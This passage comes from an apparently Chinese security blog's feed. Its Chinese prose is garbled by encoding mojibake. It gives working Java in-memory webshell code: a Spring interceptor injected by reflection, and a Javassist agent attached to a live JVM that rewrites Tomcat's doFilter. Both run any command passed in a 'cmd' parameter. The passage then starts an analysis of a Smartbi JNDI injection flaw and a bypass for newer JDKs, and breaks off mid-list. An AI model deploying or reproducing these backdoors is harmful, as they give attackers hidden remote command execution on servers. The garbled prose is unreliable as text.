class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Shell_Interceptor_Controller</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br> <br>        <span class="hljs-comment">//è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());<br> <br>        <span class="hljs-comment">//è·å–adaptedInterceptorså±æ€§å€¼</span><br>        org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br> <br> <br>        <span class="hljs-comment">//å°†æ¶æ„Interceptoræ·»åŠ å…¥adaptedInterceptors</span><br>        <span class="hljs-type">Shell_Interceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Interceptor</span>();<br>        adaptedInterceptors.add(shell_interceptor);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span>&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å¯¹åº”è·¯ç”±<code>/inject</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-71.png" alt="img55"></p><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-72.png" alt="img56"></p><h2 id="Java-Agentå†…å­˜é©¬"><a href="#Java-Agentå†…å­˜é©¬" class="headerlink" title="Java Agentå†…å­˜é©¬"></a>Java Agentå†…å­˜é©¬</h2><p>æœ‰å…³Java Agentçš„çŸ¥è¯†ç‚¹å¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« <a href="https://myloveguoguo.github.io/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/">Instrumentæ’æ¡©æŠ€æœ¯</a>ï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç»ã€‚</p><h3 id="Agentå†…å­˜é©¬"><a href="#Agentå†…å­˜é©¬" class="headerlink" title="Agentå†…å­˜é©¬"></a>Agentå†…å­˜é©¬</h3><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡Java AgentæŠ€æœ¯æ¥ä¿®æ”¹æ­£åœ¨è¿è¡ŒJVMä¸­çš„æ–¹æ³•ä½“ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥Hookä¸€äº›JVMä¸€å®šä¼šè°ƒç”¨ã€å¹¶ä¸”Hookä¹‹åä¸ä¼šå½±å“æ­£å¸¸ä¸šåŠ¡é€»è¾‘çš„çš„æ–¹æ³•æ¥å®ç°å†…å­˜é©¬ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥Spring Bootä¸ºä¾‹ï¼Œæ¥å®ç°ä¸€ä¸ªAgentå†…å­˜é©¬</p><h4 id="Spring-Bootä¸­çš„Tomcat"><a href="#Spring-Bootä¸­çš„Tomcat" class="headerlink" title="Spring Bootä¸­çš„Tomcat"></a>Spring Bootä¸­çš„Tomcat</h4><p>æˆ‘ä»¬çŸ¥é“ï¼ŒSpring Bootä¸­å†…åµŒäº†ä¸€ä¸ªembed Tomcatä½œä¸ºå…¶å¯åŠ¨å®¹å™¨ã€‚æ—¢ç„¶æ˜¯Tomcatï¼Œé‚£è‚¯å®šæœ‰ç›¸åº”çš„ç»„ä»¶å®¹å™¨ã€‚æˆ‘ä»¬å…ˆæ¥è°ƒè¯•ä¸€ä¸‹SpringBootï¼Œéƒ¨åˆ†è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">Context:<span class="hljs-number">20</span>, Context_Learn (com.example.spring_controller)<br>...<br>(org.springframework.web.servlet.mvc.method.annotation)<br>handleInternal:<span class="hljs-number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)<br>handle:<span class="hljs-number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)<br>doDispatch:<span class="hljs-number">1067</span>, DispatcherServlet (org.springframework.web.servlet)<br>doService:<span class="hljs-number">963</span>, DispatcherServlet (org.springframework.web.servlet)<br>processRequest:<span class="hljs-number">1006</span>, FrameworkServlet (org.springframework.web.servlet)<br>doGet:<span class="hljs-number">898</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">655</span>, HttpServlet (javax.servlet.http)<br>service:<span class="hljs-number">883</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">764</span>, HttpServlet (javax.servlet.http)<br>internalDoFilter:<span class="hljs-number">227</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">53</span>, WsFilter (org.apache.tomcat.websocket.server)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">100</span>, RequestContextFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">93</span>, FormContentFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilterInternal:<span class="hljs-number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)<br>doFilter:<span class="hljs-number">117</span>, OncePerRequestFilter (org.springframework.web.filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>...<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¼šæŒ‰ç…§è´£ä»»é“¾æœºåˆ¶åå¤è°ƒç”¨<code>ApplicationFilterChain#doFilter()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> request;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> response;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.security.AccessController.doPrivileged(<br>                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;<br>                            internalDoFilter(req,res);<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                        &#125;<br>                );<br>            &#125; ...<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            internalDoFilter(request,response);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿåˆ°internalDoFilter()æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,</span><br><span class="hljs-params">                                  ServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Call the next filter if there is one</span><br>        <span class="hljs-keyword">if</span> (pos &lt; n) &#123;<br>            ...<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸¤ä¸ªæ–¹æ³•å‡æ‹¥æœ‰ServletRequestå’ŒServletResponseï¼Œå¹¶ä¸”hookä¸ä¼šå½±å“æ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤å¾ˆé€‚åˆä½œä¸ºå†…å­˜é©¬çš„å›æ˜¾ã€‚ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨</p><h4 id="åˆ©ç”¨Java-Agentå®ç°Spring-Filterå†…å­˜é©¬"><a href="#åˆ©ç”¨Java-Agentå®ç°Spring-Filterå†…å­˜é©¬" class="headerlink" title="åˆ©ç”¨Java Agentå®ç°Spring Filterå†…å­˜é©¬"></a>åˆ©ç”¨Java Agentå®ç°Spring Filterå†…å­˜é©¬</h4><p>æˆ‘ä»¬å¤ç”¨ä¸Šé¢çš„agentmain-Agentï¼Œä¿®æ”¹å­—èŠ‚ç çš„å…³é”®åœ¨äº<code>transformer()</code>æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬é‡å†™è¯¥æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br> <br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_Transform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br> <br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br> <br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br> <br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br> <br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br> <br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br> <br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Inject_Agent_Springç±»å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.java.inject;<br> <br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br> <br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject_Agent_Spring</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br> <br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;<br> <br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br><span class="hljs-comment">//            System.out.println(vmd.displayName());</span><br> <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ä¸€ä¸ªç®€å•çš„Spring Booté¡¹ç›®</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-84.png" alt="img57"></p><p>è¿è¡Œ<code>Inject_Agent_Spring</code>ç±»ï¼Œåœ¨doFilteræ–¹æ³•ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼ŒæˆåŠŸæ‰§è¡Œ</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-85.png" alt="img58"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbi_JNDI</title>
    <link href="/2023/11/28/Smartbi-JNDI/"/>
    <url>/2023/11/28/Smartbi-JNDI/</url>
    
    <content type="html"><![CDATA[<h1 id="Smartbiâ€”â€”é«˜ç‰ˆæœ¬JNDIæ³¨å…¥ã€‚"><a href="#Smartbiâ€”â€”é«˜ç‰ˆæœ¬JNDIæ³¨å…¥ã€‚" class="headerlink" title="Smartbiâ€”â€”é«˜ç‰ˆæœ¬JNDIæ³¨å…¥ã€‚"></a>Smartbiâ€”â€”é«˜ç‰ˆæœ¬JNDIæ³¨å…¥ã€‚</h1><h2 id="å‰æƒ…æè¦ï¼š"><a href="#å‰æƒ…æè¦ï¼š" class="headerlink" title="å‰æƒ…æè¦ï¼š"></a>å‰æƒ…æè¦ï¼š</h2><p>Smartbiå­˜åœ¨æœªæˆæƒè®¿é—®åå°æ¥å£æ¼æ´ï¼Œç»“åˆ DB2 JDBC åˆ©ç”¨æ–¹å¼ï¼Œå¯å¯¼è‡´ JNDI æ³¨å…¥æ¼æ´ã€‚</p><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p>é¦–å…ˆä»å‚æ•°æ¥æ”¶ç‚¹å…¥æ‰‹ã€‚åœ¨RMIServletä¸­<code>doGet</code>å’Œ<code>doPost</code>ç”¨äºå‚æ•°æ¥æ”¶</p><p><code>doGet</code>ï¼šé€šè¿‡å‚æ•°jsonCallbackæ¥æ¥æ”¶<code>className</code></p><p><img src="https://i.miji.bid/2023/11/28/030d42f1843e49ad885c184da4af9c08.png" alt="image-20231128144801429"></p><p><code>doPost</code>é€šè¿‡è§£æRMIä¿¡æ¯æ¥è·å–classNameã€methodNameã€paramsã€‚è¿™ä¸‰ä¸ªå˜é‡åœ¨ä¹‹å‰çš„åˆ†ææ–‡ç« ä¹Ÿç»å¸¸å‡ºç°ã€‚å®é™…å°±æ˜¯è¦æ‰§è¡Œçš„ç±»åã€æ–¹æ³•åã€åŠ å‚æ•°ã€‚</p><p><img src="https://i.miji.bid/2023/11/28/59b00e892f9859ac9f296c3d03079eec.png" alt="image-20231128151149611"></p><p><code>processExecute</code>æ–¹æ³•çš„ä½œç”¨æ˜¯è§£æ<code>request</code>ä¸­çš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶åˆ©ç”¨åå°„æœºåˆ¶è°ƒç”¨æŒ‡å®šç±»çš„æŒ‡å®šæ–¹æ³•ï¼Œå¹¶å°†<code>params</code>è½¬åŒ–ä¸ºå¯¹åº”ç±»å‹çš„å‚æ•°ä¼ å…¥åˆ°è¯¥æ–¹æ³•ä¸­å»æ‰§è¡Œã€‚æœ€ç»ˆï¼Œå°†æ–¹æ³•æ‰§è¡Œçš„ç»“æœä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼Œå¹¶èµ‹ç»™<code>resultStr</code>å˜é‡ã€‚</p><p><img src="https://i.miji.bid/2023/11/28/e0fc0a5766420ecf36d00be4f7b8fc15.md.png" alt="image-20231128153234000"></p><p><code>testConnection</code>ä»æ•°æ®åº“è¿æ¥æ± ä¸­è·å–äº†ä¸€ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡</p><p><img src="https://i.miji.bid/2023/11/28/b956c56783af239a6468fe7ce63f57df.png" alt="image-20231128154707425"></p><p><code>getConnection</code>ä¸­æœ‰å¾ˆå¤šè¿æ¥æ–¹æ³•ã€‚é‡ç‚¹å…³æ³¨è¿™ä¸ªJNDIè¿æ¥æ–¹å¼ã€‚é¦–å…ˆä»ä¸Šé¢æ¥æ”¶çš„<code>url</code>åæˆªå–JNDIåé¢çš„å­—ç¬¦ä¸²è¿›è¡Œ<code>lookup</code>ï¼Œå…¶ä¸­<code>lookup</code>çš„å‚æ•°å¯æ§ï¼Œè¿™ä¹Ÿæ˜¯æœ¬æ¬¡æ¼æ´çš„è§¦å‘ç‚¹ã€‚</p><p><img src="https://i.miji.bid/2023/11/28/798283be34f3fed7f525ccbf066e37f4.png" alt="image-20231128154917257"></p><h2 id="é«˜ç‰ˆæœ¬JNDIä»‹ç»ï¼š"><a href="#é«˜ç‰ˆæœ¬JNDIä»‹ç»ï¼š" class="headerlink" title="é«˜ç‰ˆæœ¬JNDIä»‹ç»ï¼š"></a>é«˜ç‰ˆæœ¬JNDIä»‹ç»ï¼š</h2><p>ä½ç‰ˆæœ¬çš„JNDIæ³¨å…¥æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ¶æ„ç±»çš„ã€‚ä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬å®˜æ–¹å¯¹è¿œç¨‹åŠ è½½ç±»è¿›è¡Œäº†é™åˆ¶ã€‚ç›®å‰é«˜ç‰ˆæœ¬JDKçš„é˜²æŠ¤æ–¹å¼ä¸»è¦æ˜¯é’ˆå¯¹åŠ è½½è¿œç¨‹çš„<code>ObjectFactory</code>çš„åŠ è½½åšé™åˆ¶ï¼Œåªæœ‰å¼€å¯äº†æŸäº›å±æ€§åæ‰ä¼šé€šè¿‡æŒ‡å®šçš„è¿œç¨‹åœ°å€è·å–<code>ObjectFactory</code>çš„Classå¹¶å®ä¾‹åŒ–ï¼Œè¿›è€Œé€šè¿‡<code>ObjectFactory#getObjectInstance</code>æ¥è·å–è¿”å›çš„çœŸå®å¯¹è±¡ã€‚</p><p>ä½†æ˜¯åœ¨åŠ è½½è¿œç¨‹åœ°å€è·å–<code>ObjectFactory</code>å‰ï¼Œé¦–å…ˆåœ¨æœ¬åœ°<code>ClassPath</code>ä¸‹åŠ è½½æŒ‡å®šçš„<code>ObjectFactory</code>ï¼Œæœ¬åœ°åŠ è½½<code>ObjectFactory</code>å¤±è´¥åæ‰ä¼šåŠ è½½è¿œç¨‹åœ°å€çš„<code>ObjectFactory</code>ï¼Œæ‰€ä»¥ä¸€ä¸ªä¸»è¦çš„ç»•è¿‡æ€è·¯å°±æ˜¯åŠ è½½æœ¬åœ°ClassPathä¸‹çš„<code>ObjectFactory</code>ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ª<code>javax.naming.spi.ObjectFactory</code>æ¥å£çš„å®ç°ç±»ï¼Œåœ¨è¿™ä¸ªå®ç°ç±»çš„<code>getObjectInstance</code>å¯ä»¥å®ç°ä¸€äº›æ¶æ„æ“ä½œã€‚ä½†æ˜¯åœ¨JDKæä¾›çš„åŸç”Ÿå®ç°ç±»é‡Œå…¶å®å¹¶æ²¡æœ‰æ“ä½œç©ºé—´ã€‚æ‰€ä»¥ä¸‹é¢æˆ‘ä»¬ä¸»è¦çš„æ€è·¯å°±æ˜¯åœ¨ä¸€äº›å¸¸ç”¨çš„æ¡†æ¶æˆ–è€…ç»„ä»¶ä¸­å¯»æ‰¾å¯åˆ©ç”¨çš„ObjectFactoryå®ç°ç±»ã€‚</p><p>è€ŒSmartbiè‡ªå¸¦çš„jdkç‰ˆæœ¬æ˜¯<code>8.0.202.3</code>ï¼Œæ­£æ˜¯ä¿®å¤JNDIè¿‡åçš„é«˜ç‰ˆæœ¬jdkã€‚</p><p><img src="https://i.miji.bid/2023/11/28/fa9424a8d2cd310b285f901b2675b335.png" alt="image-20231128155329452"></p><h3 id="ç»•è¿‡æ€è·¯ï¼š"><a href="#ç»•è¿‡æ€è·¯ï¼š" class="headerlink" title="ç»•è¿‡æ€è·¯ï¼š"></a>ç»•è¿‡æ€è·¯ï¼š</h3><p>Tomcatä¸‹çš„ç»•è¿‡æ¯”è¾ƒç²¾å½©çš„å¹¶ä¸æ˜¯ELè¡¨è¾¾å¼åˆ©ç”¨ï¼Œè€Œæ˜¯é€šè¿‡<code>BeanFactory#getObjectInstance</code>å°†è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨é¢ä»ä»…ä»…åªèƒ½ä»<code>ObjectFactory</code>å®ç°ç±»çš„<code>getObjectInstance</code>æ–¹æ³•åˆ©ç”¨æ‰©å±•ä¸ºä¸€æ¬¡å¯ä»¥è°ƒç”¨â€ä»»æ„â€ç±»çš„â€ä»»æ„â€æ–¹æ³•çš„æœºä¼šï¼Œä½†æ˜¯å¯¹è°ƒç”¨çš„ç±»å’Œæ–¹æ³•ä»¥åŠå‚æ•°æœ‰äº›é™åˆ¶ã€‚</p><ul><li>è¯¥ç±»å¿…é¡»åŒ…å«publicæ— å‚æ„é€ 